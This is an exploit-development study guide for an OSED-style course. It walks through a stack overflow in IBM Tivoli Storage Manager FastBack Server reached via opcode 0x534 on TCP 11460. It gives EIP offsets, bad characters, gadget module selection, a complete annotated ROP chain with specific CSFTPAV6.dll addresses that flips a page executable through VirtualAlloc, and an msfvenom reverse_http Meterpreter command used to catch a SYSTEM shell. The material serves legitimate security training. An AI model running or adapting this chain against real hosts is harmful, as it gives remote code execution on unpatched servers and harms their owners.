# Stack Overflows & DEP Bypass — A Practitioner's Study Guide

**OSED / EXP-301 Module 10 companion.** Case study: IBM Tivoli Storage Manager FastBack Server (32-bit, `FastBackServer.exe`), sscanf-driven stack overflow reachable via opcode `0x534` on TCP `11460`.

This guide is written to teach **methodology and judgement**, not to be memorised. The exploit's numeric addresses are specific to one binary on one patch level; the *decisions* behind them are what transfer to every future target. Each section ends with a **Signal vs. Noise** box: what deserves your time, and what is a rabbit hole.

---

## 0. The one-paragraph mental model

DEP marks the stack (and other data pages) non-executable via the CPU's NX bit, so your classic `JMP ESP → shellcode-on-stack` dies with an access violation the instant EIP lands on data. You cannot execute data, but you *can* execute code that already exists in the process. ROP chains together tiny snippets of that existing code (`gadgets`, each ending in `RET`) to make a legitimate Win32 call — `VirtualAlloc` or `VirtualProtect` — that flips your shellcode's page to `PAGE_EXECUTE_READWRITE`. You are not fighting DEP; you are asking the OS, in its own API vocabulary, to make your page executable, then jumping into it. Everything below is the plumbing for that single idea.

---

## 1. DEP: what it actually enforces

DEP (Windows XP SP2 / Server 2003 SP1 onward) sets the NX bit on data pages. Enforcement is per-page, done by the CPU, and visible in WinDbg via `!vprot <addr>`:

- Code page (e.g. inside ntdll): `PAGE_EXECUTE_READ` — executable.
- Stack page: `PAGE_READWRITE` — writable, **not** executable.

System-wide policy has four modes, set in `boot.ini` (XP) or `bcdedit.exe` (Vista+): `OptIn`, `OptOut`, `AlwaysOn`, `AlwaysOff`.

| Default policy | Client (Win7/10) | Server (2012/2019) |
|---|---|---|
| DEP mode | **OptIn** | **AlwaysOn** |

**Practitioner notes that matter later:**

- DEP *can* be toggled per-process at runtime by `NtSetInformationProcess` (the `LdrpCheckNXCompatibility` routine in ntdll decides at load). This is the seed of the earliest bypasses.
- **Permanent DEP** (Vista SP1 / XP SP3): binaries linked `/NXCOMPAT` are `OptIn`-locked and cannot have DEP disabled for the process lifetime. `SetProcessDEPPolicy` gives the same lock. Consequence for you: **assume you cannot switch DEP off process-wide.** Your only move is to play by DEP's rules — make a specific page executable.

**Verifying DEP on your target:**

- `!nmod` (Narly extension, `.load narly`) parses the PE header and reports `/DEP`, `/SafeSEH`, `*ASLR` etc. FastBack ships **`/SafeSEH OFF`** and *no* DEP flag — it was never compiled with it.
- Because FastBack doesn't enable DEP natively, the module has you enforce it externally with **WDEG** (Windows Defender Exploit Guard, the successor to EMET): *Windows Security → App & browser control → Exploit protection settings → Program settings → add `FastBackServer.exe` → override "Data Execution Prevention (DEP)" ON*, then restart the service.
- Caveat: after enabling DEP via WDEG, `!nmod` will **still not** show DEP, because Narly only reads the PE header, not the runtime enforcement state. Confirm empirically instead: write NOPs to the stack, point EIP at them, single-step, and watch for `c0000005`.

> **Signal vs. Noise.** *Signal:* know your target's mitigation set (`!nmod`) and the OS default before you plan anything. *Noise:* memorising the four policy modes or EMET history — trivia. You need exactly one fact: "can I disable DEP for this process?" and post-Permanent-DEP the answer is no, so don't waste time looking for `NtSetInformationProcess` tricks on modern targets.

---

## 2. Why ROP, and the three ways to win

Bypass lineage: Linux `ret2libc` → Windows `ret2libc` → generalised **ROP** (Krahmer's borrowed-code-chunks paper; extended by Shacham and Solé). Instead of returning to the *start* of a function, you return to any instruction sequence ending in `RET`. Chain enough of them and you have Turing-complete computation built from someone else's `.text`.

The key enabler on x86 is **variable-length instructions**: you can land *mid-opcode* and decode a completely different, still-useful instruction. Example from the module — the same bytes at `0x004c10ee` disassemble as `POP EBP ; RET`, but at `0x004c10ed` as `ADD AL,0x5D ; RET`. Fixed-length ISAs (ARM) don't give you this bonus. This is why gadget counts are huge (30k+ in one binary).

**Two strategic goals** once you can run gadgets:

1. **100% ROP shellcode** — do everything in gadgets. Powerful, but painful; rarely worth it.
2. **ROP stage → traditional shellcode** — use a short ROP chain to make a page executable, copy/land shellcode there, jump in. **This is the standard approach. Choose this.**

**Three concrete API strategies for goal #2:**

| API | Idea | When to prefer |
|---|---|---|
| `VirtualAlloc` (MEM_COMMIT on an already-committed page) | Change protection of the page your shellcode already sits on | Module's choice; shellcode already on stack |
| `VirtualProtect` | Directly change protection of existing shellcode page | Fewer args to fake sometimes; same effect |
| `WriteProcessMemory` | Hot-patch `.text`, inject shellcode into executable memory, jump in | "Follow DEP's rules" — no page-protection change needed |

> **Signal vs. Noise.** *Signal:* pick one API and commit; `VirtualAlloc`/`VirtualProtect` are the bread-and-butter. *Noise:* attempting a full 100% ROP payload for a CTF-style single-shot — you'll burn hours building gadget arithmetic you didn't need. Also noise: ret2libc-era `NtSetInformationProcess` disabling — dead against Permanent DEP.

---

## 3. Finding gadgets — tooling and what to search for

You will not eyeball 13,000 `RET` sites. Automate.

### Tools

- **pykd** (Python-in-WinDbg). Build understanding once by writing a finder; you'll rarely use it in anger. The algorithm is worth internalising (below).
- **rp++** (`rp-win-x86.exe`, standalone, reads the file off disk). **This is your daily driver** — orders of magnitude faster than a debugger-hosted script, cross-platform, PE/ELF/Mach-O.
- **Mona** — excluded in this module because it lacked Python3 / 64-bit support at the time; still ubiquitous elsewhere.

### The finder algorithm (why it works — learn this, not the code)

1. Resolve the module's base→end range; every page is `0x1000` bytes.
2. Keep only **executable** pages (`getVaProtect` ∈ {`PAGE_EXECUTE` 0x10, `PAGE_EXECUTE_READ` 0x20, `PAGE_EXECUTE_READWRITE` 0x40, `PAGE_EXECUTE_WRITECOPY` 0x80}). Gadgets from non-exec pages would themselves fault under DEP.
3. Scan every byte for a `RET`: opcode `0xC3` (near ret) or `0xC2 xx xx` (ret imm16).
4. From each `RET`, walk **backwards** byte by byte, disassembling forward each time, up to a small window. Each valid decode that ends in the `RET` is a candidate gadget.
5. Filter out garbage and anything that breaks the chain.

### rp++ in practice

```
rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt
```

`-r 5` = **max 5 instructions** per gadget (rp++ counts instructions; the pykd script counted *bytes* — don't confuse the two). Output form:

```
0x5050118e: mov eax, esi ; pop esi ; ret ;  (1 found)
```

Search it like text. Anchor your searches so nothing sneaks between the instruction you want and the `RET`:

```
findstr /C:": pop eax ; ret" rop.txt
findstr /C:": mov dword [esi], eax ; ret" rop.txt
```

### The bad-instruction filter (the real skill)

Reject any gadget containing these, because they fault, are privileged, or wreck control flow:

- **Privileged / faulting:** `clts hlt lmsw ltr lgdt lidt lldt`, `mov cr/dr/tr`, `in ins out outs`, `invlpg invd`, `cli sti`, `iret(d)`, `swapgs wbinvd`, plus WinDbg's `???` (undecodable).
- **Flow-breaking:** `call jmp leave ja jb jc je jg jl jn jo jp js jz lock enter wait` and friends — anything that moves EIP somewhere you didn't put on the stack.

Every gadget **must end in `RET`** or the chain stops dead. (Advanced: a *deliberate* `call`/conditional-jump gadget is occasionally useful if you shape the stack for it — but treat that as a last resort, not a default.)

> **Signal vs. Noise.** *Signal:* master rp++ search syntax and the bad-instruction list — that's 90% of gadget hunting. Keep `-r` low (5); long gadgets almost always drag in a `call`/`jmp` that ruins them. *Noise:* hand-writing and optimising a pykd finder for production use, or reading rp++'s C++ internals. Write the pykd script once for the mental model, then never again. Also noise: chasing "perfect" clean gadgets — a gadget with a harmless side effect (`inc esi ; add al,0x2B ; ret`) is fine if the side-effect register is one you don't care about.

---

## 4. Choosing your gadget source module (the decision that saves the exploit)

This is the single most important early decision and the one beginners skip.

**Constraint 1 — bad characters.** For FastBack the overflow flows through `sscanf` on a null-terminated string, so the payload cannot contain: `0x00 0x09 0x0A 0x0B 0x0C 0x0D 0x20`. **Every gadget address** you use must be free of these bytes, or the chain truncates before it's delivered.

**Constraint 2 — the module's address range.** `lm m FastBackServer` shows `00400000–00c0c000`: the **top byte is `0x00`**. Since `0x00` is a bad char and it appears in *every* FastBack gadget address, **you cannot source gadgets from the main executable at all.** This is why you dump every loaded module's range looking for one whose base avoids the bad bytes.

**Constraint 3 — stability / no ASLR.** Prefer a module **shipped with the application** (so its base is consistent across the target estate) and **not ASLR-protected** (so the address you hardcode is the address at runtime). A native Windows DLL is a bad choice: its gadget addresses drift with patch level, and it likely has extra mitigations.

**The winner:** `CSFTPAV6.dll`, base `0x50500000–0x50577000`. Every gadget starts with `0x50` — no null, no bad chars — and it ships with FastBack, no ASLR. Copy it out and run rp++ against it.

```
copy "C:\Program Files\Tivoli\TSM\FastBack\server\csftpav6.dll" .
rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt
```

> **Signal vs. Noise.** *Signal:* before hunting a single gadget, enumerate modules and pick one that is (a) bad-char-clean in its address bytes, (b) app-shipped, (c) non-ASLR. Getting this right makes the rest mechanical. *Noise:* grinding gadgets out of the main EXE "because that's the vuln" — if its addresses carry `0x00`, you've wasted the effort. Don't start in a debugger; rp++ on disk is faster.

---

## 5. Anatomy of the exploit before ROP

The trigger PoC sends a `psAgentCommand` header (opcode `0x534`, memcpy offset/size fields) followed by a `psCommandBuffer` format string whose `%s` is a long attacker string handed to `sscanf`.

**Offsets (find these first, always):**

- Metasploit `msf-pattern_create -l 0x200` into the `%s`, crash, read EIP = `41326a41`, `msf-pattern_offset -q 41326a41` → **offset 276** to EIP.
- ESP at crash points **right after** the return address (offset 280) → **no extra padding** needed between saved-EIP and your ROP chain. That is a gift; verify it, don't assume it on other bugs.

```
offset = b"A" * 276
eip    = b"B" * 4        # overwrites saved return address
rop    = b"C" * (0x400 - 276 - 4)
```

**The VirtualAlloc call skeleton** you place on the stack (via the overflow), to be patched by ROP:

```
[ VirtualAlloc addr ]  -> unknown at build time  (placeholder 0x45454545)
[ return address    ]  -> shellcode addr, unknown (0x46464646)
[ lpAddress         ]  -> shellcode addr, unknown (0x47474747)
[ dwSize            ]  -> 0x00000001  (has null bytes) (0x48484848)
[ flAllocationType  ]  -> 0x00001000  (has null bytes) (0x49494949)
[ flProtect         ]  -> 0x00000040  (has null bytes) (0x51515151)
```

Three problems, all solved by ROP at runtime: (1) you don't know VirtualAlloc's address, (2) you don't know the shellcode's stack address, (3) the constant args contain null bytes. So you ship **placeholders** and let gadgets overwrite each one with the correct value in place.

> **Signal vs. Noise.** *Signal:* nail EIP/ESP offsets and the bad-char set before touching ROP; lay out the call skeleton explicitly so you know exactly which DWORD each sub-chain must fix. *Noise:* trying to compute correct arg values on your build machine — you *can't* (addresses are runtime), so don't try; that's the whole point of patching in place.

---

## 6. VirtualAlloc — the target call

```c
LPVOID WINAPI VirtualAlloc(
  _In_opt_ LPVOID lpAddress,        // shellcode page
  _In_     SIZE_T dwSize,           // 0x01 (per-page granularity, any 1..0x1000)
  _In_     DWORD  flAllocationType, // MEM_COMMIT = 0x1000
  _In_     DWORD  flProtect         // PAGE_EXECUTE_READWRITE = 0x40
);
```

Calling `VirtualAlloc` with `MEM_COMMIT` on a page that is *already committed* (your stack) simply **changes its protection** — same outcome as `VirtualProtect`. As long as shellcode < `0x1000` bytes, `dwSize = 1` covers the whole page.

To invoke it via ROP you build a fake stack frame: `[VirtualAlloc][retaddr=shellcode][lpAddress][dwSize][flAllocationType][flProtect]`, then realign ESP onto it and `RET` into VirtualAlloc. When VirtualAlloc's own `RET 0x10` fires, EIP pops your "return address" = shellcode, which is now executable.

---

## 7. The ROP chain, stage by stage — patterns you will reuse forever

The whole chain reduces to a handful of **reusable micro-patterns**. Learn the patterns; the specific gadget addresses are disposable.

### 7.1 Get a copy of ESP into a working register

You may never clobber ESP (it must always point at the next gadget). So copy it. `MOV EAX, ESP` gadgets essentially don't exist naturally; you improvise:

```
0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret   ; ESP -> ESI
```

**Pattern:** *"stack pivot read"* — get the live stack pointer into a general register (here ESI) so you can compute addresses of your placeholders relative to it.

### 7.2 Address arithmetic without null bytes (the recurring headache)

You constantly need small offsets (`0x1C`, `0x4`, `0x210`…) but small positive constants are `0x0000001C` — full of nulls. **Four interchangeable tricks:**

1. **Add a negative instead of subtracting a positive.** `-0x1C = 0xFFFFFFE4` (null-free). Pop it into ECX, `ADD EAX, ECX`. (`? -0x1c` in WinDbg = `ffffffe4`.)
2. **`NEG`** to synthesise `0x1`: pop `0xFFFFFFFF`, `NEG EAX` → `0x00000001`. Used for `dwSize`.
3. **Split into two null-free addends.** Need `0x1000`? `0x80808080 + 0x7F7F8F80 = 0x1000` (32-bit wraps, high bits discarded). Need `0x40`? `0x80808080 + 0x7F7F7FC0`. Used for `flAllocationType` and `flProtect`.
4. **`INC reg` repeated.** No `ADD ESI,4` gadget? Use `INC ESI` four times (side effects on a throwaway register are fine).

**Working-register hygiene:** arithmetic is far easier in EAX/ECX than ESI, because compiled code produces far more `pop eax/ecx`, `add eax,ecx` gadgets. So the recurring dance is: **move ESI→EAX, compute in EAX, push EAX→ESI back.**

### 7.3 Resolve VirtualAlloc from the IAT at runtime

You can't know KERNEL32!VirtualAllocStub's address (it moves every boot), but the **IAT slot** that holds it in CSFTPAV6 is at a fixed module offset (`0x5054A220`). Dereference it at runtime:

- Problem: `0x5054A220` contains `0x20` (a bad char). **Trick:** ship `IAT+1 = 0x5054A221`, pop into EAX, add `-1` (`0xFFFFFFFF`) to restore `0x5054A220`, then `MOV EAX, [EAX]` to dereference → real VirtualAlloc address in EAX.

```
pop eax ; ret            -> 0x5054A221   (IAT+1, dodges 0x20)
pop ecx ; ret            -> 0xFFFFFFFF   (-1)
add eax, ecx ; ret       -> EAX = 0x5054A220
mov eax, dword [eax] ; ret-> EAX = &VirtualAlloc
```

**Pattern:** *"dodge a bad byte in a constant by offsetting ±1 and correcting with arithmetic."* Applies to addresses and args alike.

### 7.4 Write a computed value onto the stack

The universal *store* primitive:

```
mov dword [esi], eax ; ret
```

You will call this **once per skeleton field** (VirtualAlloc addr, return addr, lpAddress, dwSize, flAllocationType, flProtect). The rhythm for each field is identical:

> **align ESI to the target slot** (via `INC ESI ×4`) → **compute the value into EAX** (using §7.2 tricks) → **`MOV [ESI], EAX`**.

Internalise that three-beat rhythm and the whole 40-line chain becomes six repetitions of the same idea.

### 7.5 Patch the return address and lpAddress (shellcode's stack address)

Shellcode sits *after* the ROP chain, whose length you don't know until you're done — chicken and egg. Solve it with a **placeholder offset from ESI** that you finalise last:

- Copy ESI→EAX (restore ESI afterward with `push eax ; pop esi`), subtract a null-free negative (`-0x210 = 0xFFFFFDF0`) to point EAX near where shellcode will be, `MOV [ESI], EAX`. `0x210` not `0x200` specifically to avoid nulls.
- After the chain is frozen, dump the stack, measure the exact gap from chain-end to your first shellcode byte, and either fix the offset constant or (simpler) **insert padding**. In the module the final gap was `0xE0 = 224` bytes of padding.

### 7.6 Pivot ESP onto the fake frame and fire

No clean `ADD ESP, x`. The available pivot is:

```
xchg eax, ebp ; ret         ; get target addr into EBP
mov esp, ebp ; pop ebp ; ret ; ESP <- EBP  (note: pops one dword!)
```

Because `MOV ESP,EBP` is followed by `POP EBP`, aim EBP **four bytes before** the VirtualAlloc slot so the stray `POP` consumes a dummy DWORD and leaves ESP exactly on VirtualAlloc. Then the final `RET` enters VirtualAlloc; its `RET 0x10` returns into your (now executable) shellcode.

**Debugging tactic for reused gadgets:** many gadgets appear multiple times in the chain, so a plain breakpoint fires too early. Use **conditional breakpoints** on a register state unique to the occurrence you want:

```
bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
```

Or a **temporary `int3` gadget** appended to the chain to stop exactly after the last write (remove it for the real exploit — leaving it in causes a crash).

> **Signal vs. Noise.** *Signal:* recognise the six-field store rhythm and the four null-avoidance tricks — that's the entire chain. Single-step in WinDbg the first time so you *see* ESI/EAX move; trust the pattern after that. Use conditional breakpoints and a throwaway `int3` gadget to navigate. *Noise:* hunting for the "ideal" gadget (`sub esi,0x1c ; ret`, `mov eax,esp ; ret`) — they usually don't exist; stop looking after a minute and improvise with the tricks. Also noise: perfectly computing the shellcode offset up front — ship a placeholder and pad at the end.

---

## 8. Landing the shellcode

1. **Measure available space** at the shellcode landing (`dd eip L40` after VirtualAlloc returns). The module found only **240 bytes** — too small for a staged Meterpreter. Fix: **grow the buffer** (`0x400 → 0x600`).
2. **Generate with the bad-char list**, or the encoder will emit bytes that `sscanf` truncates:

```
msfvenom -p windows/meterpreter/reverse_http LHOST=... LPORT=8080 \
  -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
```

`shikata_ga_nai` inflates 544-byte payloads — budget space accordingly.
3. Start a `multi/handler` matching the payload, run the exploit **without** WinDbg attached, catch a `NT AUTHORITY\SYSTEM` session.

> **Signal vs. Noise.** *Signal:* always pass `-b` to msfvenom and always measure landing space before choosing a payload. A staged payload needs room for the stage to unpack. *Noise:* fighting a cramped buffer with exotic egg-hunters when you can simply enlarge the request — reach for complexity only when the protocol won't let you grow the buffer.

---

## 9. End-to-end checklist (the transferable procedure)

1. **Recon mitigations:** `!nmod` (Narly). Note DEP/ASLR/SafeSEH. Confirm DEP enforcement empirically (NOP-on-stack test), since `!nmod` reads only the PE header.
2. **Confirm you can't just disable DEP** (Permanent DEP / `/NXCOMPAT`) — on modern targets, assume ROP is required.
3. **Get offsets:** EIP offset and where ESP points at crash (padding needed?).
4. **Enumerate bad chars** (byte-array test through the vuln).
5. **Pick a gadget module:** app-shipped, non-ASLR, address bytes free of bad chars. Reject the main EXE if its base carries `0x00`.
6. **Generate gadgets:** `rp-win-x86.exe -f <module> -r 5 > rop.txt`. Search with anchored `findstr`.
7. **Choose the API:** VirtualAlloc / VirtualProtect (default) or WriteProcessMemory.
8. **Lay the call skeleton** on the stack with placeholders.
9. **Build the chain** as repeated *align-ESI → compute-EAX → store* beats, one per field; resolve the API via IAT deref; dodge bad bytes with negative/NEG/split-add/INC tricks.
10. **Pivot ESP** onto the frame, fire the API, return into shellcode.
11. **Finalise shellcode offset** (measure, pad), **size the payload** to available space, **generate with `-b`**, catch the shell.

---

## 10. What to prioritise — the short version

**Spend your time on:**
- Mitigation recon and the bad-char set (wrong here = everything downstream breaks).
- Module selection (the highest-leverage decision).
- rp++ search fluency and the bad-instruction filter.
- The four null-avoidance tricks and the align→compute→store rhythm.
- WinDbg conditional breakpoints and `!vprot`/`dds`/`?` for verification.

**Don't waste time on:**
- Hunting mythical "perfect" gadgets — improvise instead.
- Production-grade pykd finders — write one for understanding, then use rp++.
- 100% ROP payloads unless forced.
- `NtSetInformationProcess`-style DEP-disable tricks against Permanent DEP.
- Pre-computing runtime addresses/args — patch in place.
- Exotic space-saving when you can just enlarge the buffer.

---

## Appendix A — The full annotated ROP chain (CSFTPAV6-specific)

Addresses are for one specific `CSFTPAV6.dll`; treat them as illustrations of the patterns above, not constants to reuse.

```python
rop  = pack("<L", 0x5050118e)  # mov eax, esi ; pop esi ; ret     -- ESI(=ESP copy) -> EAX
rop += pack("<L", 0x42424242)  #   junk consumed by the pop esi
rop += pack("<L", 0x505115a3)  # pop ecx ; ret
rop += pack("<L", 0xffffffe4)  #   -0x1C  (locate VirtualAlloc placeholder slot)
rop += pack("<L", 0x5051579a)  # add eax, ecx ; ret               -- EAX -> &placeholder
rop += pack("<L", 0x50537d5b)  # push eax ; pop esi ; ret          -- keep it in ESI
# --- resolve VirtualAlloc from IAT ---
rop += pack("<L", 0x5053a0f5)  # pop eax ; ret
rop += pack("<L", 0x5054A221)  #   VirtualAlloc IAT + 1  (dodge 0x20)
rop += pack("<L", 0x505115a3)  # pop ecx ; ret
rop += pack("<L", 0xffffffff)  #   -1
rop += pack("<L", 0x5051579a)  # add eax, ecx ; ret               -- EAX = real IAT addr
rop += pack("<L", 0x5051f278)  # mov eax, dword [eax] ; ret        -- EAX = &VirtualAlloc
rop += pack("<L", 0x5051cbb6)  # mov dword [esi], eax ; ret        -- patch skeleton[0]
# --- patch return address (= shellcode addr) ---
rop += pack("<L", 0x50522fa7)*4 # inc esi ; add al,0x2B ; ret  x4  -- ESI += 4
rop += pack("<L", 0x5050118e)  # mov eax, esi ; pop esi ; ret
rop += pack("<L", 0x42424242)  #   junk
rop += pack("<L", 0x5052f773)  # push eax ; pop esi ; ret          -- restore ESI
rop += pack("<L", 0x505115a3)  # pop ecx ; ret
rop += pack("<L", 0xfffffdf0)  #   -0x210  (point EAX at future shellcode)
rop += pack("<L", 0x50533bf4)  # sub eax, ecx ; ret
rop += pack("<L", 0x5051cbb6)  # mov dword [esi], eax ; ret        -- patch skeleton[1]
# --- patch lpAddress (same shellcode addr, ESI+4, -0x20C) ---
rop += pack("<L", 0x50522fa7)*4 # inc esi x4
rop += pack("<L", 0x5050118e)  # mov eax, esi ; pop esi ; ret
rop += pack("<L", 0x42424242)
rop += pack("<L", 0x5052f773)  # push eax ; pop esi ; ret
rop += pack("<L", 0x505115a3)  # pop ecx ; ret
rop += pack("<L", 0xfffffdf4)  #   -0x20C
rop += pack("<L", 0x50533bf4)  # sub eax, ecx ; ret
rop += pack("<L", 0x5051cbb6)  # mov dword [esi], eax ; ret        -- patch skeleton[2]
# --- patch dwSize = 0x01 via NEG ---
rop += pack("<L", 0x50522fa7)*4 # inc esi x4
rop += pack("<L", 0x5053a0f5)  # pop eax ; ret
rop += pack("<L", 0xffffffff)  #   -1
rop += pack("<L", 0x50527840)  # neg eax ; ret                     -- EAX = 0x01
rop += pack("<L", 0x5051cbb6)  # mov dword [esi], eax ; ret        -- patch skeleton[3]
# --- patch flAllocationType = 0x1000 via split-add ---
rop += pack("<L", 0x50522fa7)*4 # inc esi x4
rop += pack("<L", 0x5053a0f5)  # pop eax ; ret
rop += pack("<L", 0x80808080)  #   addend A
rop += pack("<L", 0x505115a3)  # pop ecx ; ret
rop += pack("<L", 0x7f7f8f80)  #   addend B  (A+B = 0x1000)
rop += pack("<L", 0x5051579a)  # add eax, ecx ; ret
rop += pack("<L", 0x5051cbb6)  # mov dword [esi], eax ; ret        -- patch skeleton[4]
# --- patch flProtect = 0x40 via split-add ---
rop += pack("<L", 0x50522fa7)*4 # inc esi x4
rop += pack("<L", 0x5053a0f5)  # pop eax ; ret
rop += pack("<L", 0x80808080)  #   addend A
rop += pack("<L", 0x505115a3)  # pop ecx ; ret
rop += pack("<L", 0x7f7f7fc0)  #   addend B  (A+B = 0x40)
rop += pack("<L", 0x5051579a)  # add eax, ecx ; ret
rop += pack("<L", 0x5051cbb6)  # mov dword [esi], eax ; ret        -- patch skeleton[5]
# --- pivot ESP onto the fake frame and fire ---
rop += pack("<L", 0x5050118e)  # mov eax, esi ; pop esi ; ret      -- ESI(flProtect slot) -> EAX
rop += pack("<L", 0x42424242)
rop += pack("<L", 0x505115a3)  # pop ecx ; ret
rop += pack("<L", 0xffffffe8)  #   -0x18  (point EAX 4 bytes before VirtualAlloc slot)
rop += pack("<L", 0x5051579a)  # add eax, ecx ; ret
rop += pack("<L", 0x5051571f)  # xchg eax, ebp ; ret               -- EBP = target-4
rop += pack("<L", 0x50533cbf)  # mov esp, ebp ; pop ebp ; ret      -- ESP lands on VirtualAlloc
# (the stray 'pop ebp' eats the -4 dummy; final ret enters VirtualAlloc)

padding   = b"C" * 0xe0        # measured gap: chain-end -> shellcode
shellcode = b"\xcc" * N        # dummy int3s first, then real msfvenom payload
```

## Appendix B — WinDbg quick reference used throughout

| Command | Purpose |
|---|---|
| `.load narly` / `!nmod` | Dump per-module mitigations (PE-header based) |
| `!vprot <addr>` | Show page protection (verify RW→RWX flip) |
| `dds <addr> Ln` / `dd <addr> Ln` | Dump stack with/without symbol resolution |
| `? <expr>` | Evaluate (compute negatives, split-add addends) |
| `u <addr> Ln` | Disassemble (confirm mid-opcode gadgets) |
| `r eip = esp` / `ed esp 90909090` | Simulate stack execution to prove DEP |
| `bp <addr> ".if <cond> {} .else {gc}"` | Conditional breakpoint for reused gadgets |
| `pt` / `p` / `g` | Step to return / step / go |

---

*Scope note: this is defensive exploit-development coursework against a specific legacy application in a controlled lab. The methodology is the transferable asset; the addresses are not.*
